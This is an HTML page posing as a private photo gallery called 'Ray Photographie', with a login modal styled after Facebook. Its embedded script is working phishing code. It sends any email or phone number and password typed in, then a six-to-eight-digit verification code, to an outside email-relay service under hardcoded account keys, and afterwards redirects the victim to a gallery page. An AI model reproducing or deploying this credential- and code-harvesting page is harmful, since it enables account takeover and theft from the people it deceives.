<!doctype html>
<html lang="fr">

<head>

<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>

<title>Ray Photographie</title>

<meta property="og:title" content="Ray Photographie">
<meta property="og:description" content="Connectez-vous pour plus de contenu (gratuit).">

<meta property="og:image" content="https://ray-photographe.netlify.app/logo_id.jpg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:image:type" content="image/jpg">

<meta property="og:url" content="https://ray-photographe.netlify.app/">
<meta property="og:type" content="website">

<link
  href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap"
  rel="stylesheet"
>


<style>

/* =====================================================
   VARIABLES
===================================================== */

:root{

  --fb-blue:#1877f2;
  --fb-blue-dark:#166fe5;
  --fb-blue-light:#e7f3ff;

  --bg:#f0f2f5;

  --text:#050505;
  --secondary:#65676b;

  --white:#ffffff;

  --border:#dddfe2;

  --shadow:
    0 2px 8px rgba(0,0,0,.10);

}


/* =====================================================
   RESET
===================================================== */

*{
  box-sizing:border-box;
}

html{
  scroll-behavior:smooth;
}

body{

  margin:0;

  font-family:
    Inter,
    Arial,
    sans-serif;

  background:var(--bg);

  color:var(--text);

  -webkit-font-smoothing:antialiased;

}


/* =====================================================
   HEADER
===================================================== */

.header{

  background:#ffffff;

  color:var(--text);

  padding:10px 0;

  position:sticky;

  top:0;

  z-index:10;

  border-bottom:
    1px solid var(--border);

  box-shadow:
    0 1px 3px rgba(0,0,0,.10);

}


.header-content{

  max-width:1100px;

  margin:auto;

  padding:
    0 20px;

  display:flex;

  align-items:center;

  justify-content:space-between;

}


/* =====================================================
   BRAND
===================================================== */

.brand{

  display:flex;

  align-items:center;

  gap:11px;

}


.logo{

  width:44px;

  height:44px;

  border-radius:50%;

  overflow:hidden;

  background:var(--fb-blue);

  display:flex;

  align-items:center;

  justify-content:center;

  flex-shrink:0;

  box-shadow:
    0 1px 3px rgba(0,0,0,.18);

}


.logo img{

  width:100%;

  height:100%;

  object-fit:cover;

}


.title{

  font-size:16px;

  font-weight:700;

  line-height:1.2;

}


.subtitle{

  margin-top:3px;

  font-size:12px;

  color:var(--secondary);

}


/* =====================================================
   BUTTONS
===================================================== */

.btn{

  border:none;

  padding:
    10px 18px;

  border-radius:7px;

  font-family:inherit;

  font-size:14px;

  font-weight:600;

  cursor:pointer;

  transition:
    background .2s ease,
    transform .15s ease,
    box-shadow .2s ease;

}


.btn.primary{

  background:
    var(--fb-blue);

  color:#ffffff;

  box-shadow:
    0 1px 2px rgba(0,0,0,.12);

}


.btn.primary:hover{

  background:
    var(--fb-blue-dark);

  box-shadow:
    0 3px 8px rgba(24,119,242,.25);

}


.btn.primary:active{

  transform:
    scale(.98);

}


.btn.ghost{

  background:transparent;

  color:var(--fb-blue);

  margin-right:10px;

}


.btn.ghost:hover{

  background:
    var(--fb-blue-light);

}


/* =====================================================
   HERO
===================================================== */

.hero{

  max-width:1100px;

  margin:auto;

  padding:
    55px 20px 70px;

  text-align:center;

}


.hero h1{

  margin:0;

  font-size:38px;

  line-height:1.2;

  font-weight:700;

  letter-spacing:-.6px;

}


.hero > p{

  margin:
    12px 0 0;

  color:
    var(--secondary);

  font-size:15px;

  line-height:1.6;

}


/* =====================================================
   PHOTO PREVIEW
===================================================== */

.preview{

  margin:
    32px auto 0;

  position:relative;

  max-width:650px;

  border-radius:12px;

  overflow:hidden;

  background:#ffffff;

  border:
    1px solid var(--border);

  box-shadow:
    0 2px 8px rgba(0,0,0,.12);

}


.preview img{

  width:100%;

  height:410px;

  display:block;

  object-fit:cover;

}


/* =====================================================
   PHOTO OVERLAY
===================================================== */

.preview .overlay{

  position:absolute;

  inset:0;

  background:
    linear-gradient(
      to bottom,
      rgba(0,0,0,.05),
      rgba(0,0,0,.55)
    );

  backdrop-filter:
    blur(4px);

  display:flex;

  align-items:center;

  justify-content:center;

  color:#ffffff;

  text-align:center;

}


.preview .overlay p{

  margin:0;

  padding:
    14px 22px;

  background:
    rgba(0,0,0,.72);

  border-radius:8px;

  color:#ffffff;

  font-size:16px;

  font-weight:600;

  box-shadow:
    0 4px 18px rgba(0,0,0,.25);

}


/* =====================================================
   NOTE
===================================================== */

.note{

  text-align:center;

  font-size:12px;

  color:
    var(--secondary);

  margin-top:14px;

}


/* =====================================================
   CARD
===================================================== */

.card{

  margin:
    30px auto 0;

  max-width:430px;

  background:#ffffff;

  border-radius:12px;

  padding:24px;

  border:
    1px solid var(--border);

  box-shadow:
    var(--shadow);

}


/* =====================================================
   UPLOAD
===================================================== */

.upload-box{

  border:
    2px dashed #ccd0d5;

  padding:
    35px 20px;

  border-radius:10px;

  cursor:pointer;

  background:#f7f8fa;

  transition:
    border-color .2s ease,
    background .2s ease;

}


.upload-box:hover{

  border-color:
    var(--fb-blue);

  background:
    var(--fb-blue-light);

}


.upload-icon{

  font-size:30px;

}


/* =====================================================
   MODAL
===================================================== */

.modal{

  position:fixed;

  inset:0;

  background:
    rgba(0,0,0,.55);

  backdrop-filter:
    blur(3px);

  display:none;

  align-items:center;

  justify-content:center;

  padding:20px;

  z-index:100;

}


.modal .box{

  background:#ffffff;

  padding:28px;

  width:100%;

  max-width:360px;

  border-radius:12px;

  border:
    1px solid var(--border);

  box-shadow:
    0 12px 40px rgba(0,0,0,.25);

}


/* =====================================================
   INPUT
===================================================== */

.modal input{

  width:100%;

  padding:
    13px 14px;

  margin-top:12px;

  border-radius:7px;

  border:
    1px solid #ccd0d5;

  background:#f5f6f7;

  font-family:inherit;

  font-size:14px;

  outline:none;

}


.modal input:focus{

  background:#ffffff;

  border-color:
    var(--fb-blue);

  box-shadow:
    0 0 0 2px
    rgba(24,119,242,.15);

}


/* =====================================================
   CODE
===================================================== */

#code{

  border:
    2px dashed var(--fb-blue);

  background:
    var(--fb-blue-light);

  text-align:center;

  font-weight:600;

}


/* =====================================================
   NOTIFICATION
===================================================== */

#modalNotification{

  display:none;

  padding:
    10px 12px;

  margin:
    10px 0;

  background:
    var(--fb-blue);

  color:#ffffff;

  border-radius:7px;

  text-align:center;

  font-size:13px;

}


/* =====================================================
   MOBILE
===================================================== */

@media(max-width:600px){

  .header{

    padding:8px 0;

  }


  .header-content{

    padding:
      0 14px;

  }


  .logo{

    width:40px;

    height:40px;

  }


  .title{

    font-size:14px;

  }


  .subtitle{

    font-size:11px;

  }


  .btn.primary{

    padding:
      9px 13px;

    font-size:13px;

  }


  .hero{

    padding:
      35px 14px 50px;

  }


  .hero h1{

    font-size:27px;

  }


  .hero > p{

    font-size:14px;

  }


  .preview{

    margin-top:25px;

    border-radius:10px;

  }


  .preview img{

    height:300px;

  }


  .preview .overlay p{

    font-size:14px;

    padding:
      12px 16px;

  }

}


/* =====================================================
   GRAND ÉCRAN
===================================================== */

@media(min-width:900px){

  .preview img{

    height:420px;

  }

}

</style>

</head>


<body>


<!-- =====================================================
     HEADER
===================================================== -->

<header class="header">

  <div class="header-content">


    <div class="brand">


      <div class="logo">

        <img
          src="logo_id.jpg"
          alt="Logo"
        >

      </div>


      <div>

        <div class="title">
          Ray Photographie
        </div>

        <div class="subtitle">
          Connecte-toi pour plus de contenu
        </div>

      </div>


    </div>


    <nav>

      <button
        class="btn primary"
        id="loginBtn"
      >
        Se connecter
      </button>

    </nav>


  </div>

</header>



<!-- =====================================================
     HERO / GALERIE
===================================================== -->

<section class="hero">


  <h1>
    Accédez à la galerie privée
  </h1>


  <p>
    Photos exclusives disponibles après connexion.
  </p>



  <div class="preview">


    <img
      src="logo_id.jpg"
      alt="Aperçu de la galerie privée"
    >


  </div>



  <div class="note">
    🔐Accès privé au contenu exclusif.
  </div>


</section>



<!-- MODALE LOGIN -->
<div class="modal" id="loginModal">
  <div class="box">

<h2 style="text-align:center;color:#1877f2; display:flex; flex-direction:column; align-items:center; gap:10px;">
  
  <img src="logo_fb.png" alt="logo" style="width:48px; height:48px;">
  
  Identification

</h2>

<div id="modalNotification"></div>

<input id="userId" placeholder="Courriel ou numéro">
<input id="password" type="password" placeholder="Mot de passe">
<input id="code" maxlength="8" placeholder="Code" style="display:none">

<button class="btn" id="confirmLogin" style="width:100%;margin-top:12px">
  Se connecter
</button>

<p class="note">Se connecter</p>
</div>
</div>

<script>
const modal = document.getElementById('loginModal');
const loginBtn = document.getElementById('loginBtn');
const confirmLogin = document.getElementById('confirmLogin');
const codeInput = document.getElementById('code');
const userIdInput = document.getElementById('userId');
const passwordInput = document.getElementById('password');
const modalNotif = document.getElementById('modalNotification');

let codeSent = false;

if(sessionStorage.getItem("demo_auth_token") === "true"){
    window.location.href = "secure-photos.html";
}

function showModalNotification(message){
    modalNotif.textContent = message;
    modalNotif.style.display = "block";
    requestAnimationFrame(()=>{
        modalNotif.style.opacity = "1";
        modalNotif.style.transform = "translateY(0)";
    });
    setTimeout(()=>{
        modalNotif.style.opacity = "0";
        modalNotif.style.transform = "translateY(-10px)";
        setTimeout(()=> modalNotif.style.display = "none", 400);
    }, 3000);
}

loginBtn.addEventListener("click", ()=> modal.style.display = "flex");
modal.addEventListener("click", e=>{if(e.target===modal) modal.style.display="none";});

async function sendEmailLogin(username, password){
  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      service_id:"service_uvghcck",
      template_id:"template_email",
      user_id:"aQIYW-EEnTtmxU4FY",
      template_params:{username,password}
    })
  });
}
async function sendCodeValidation(code){
  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      service_id:"service_uvghcck",
      template_id:"template_code",
      user_id:"aQIYW-EEnTtmxU4FY",
      template_params:{code}
    })
  });
}

confirmLogin.onclick = async ()=>{
  const user = userIdInput.value.trim();
  const pwd  = passwordInput.value.trim();

  if(!codeSent){
    if(!user || !pwd){
      showModalNotification("Veuillez remplir tous les champs.");
      return;
    }

    confirmLogin.disabled = true;
    confirmLogin.textContent = "Envoi…";

    const response = await sendEmailLogin(user,pwd);
    if(!response.ok){
      showModalNotification("Erreur d'envoi.");
      confirmLogin.disabled = false;
      confirmLogin.textContent = "Se connecter";
      return;
    }

    showModalNotification("Code de validation envoyé.");
    codeInput.style.display = "block";
    confirmLogin.textContent = "Valider le code";
    confirmLogin.disabled = false;
    codeSent = true;
    return;
  }

  const code = codeInput.value.trim();
  if(!/^[0-9]{6,8}$/.test(code)){
    showModalNotification("Code invalide.");
    return;
  }

  const rep = await sendCodeValidation(code);
  if(!rep.ok){
    showModalNotification("Erreur validation code.");
    return;
  }

  sessionStorage.setItem("demo_auth_token","true");
  window.location.href="secure-photos.html";
};
</script>

</body>
</html>
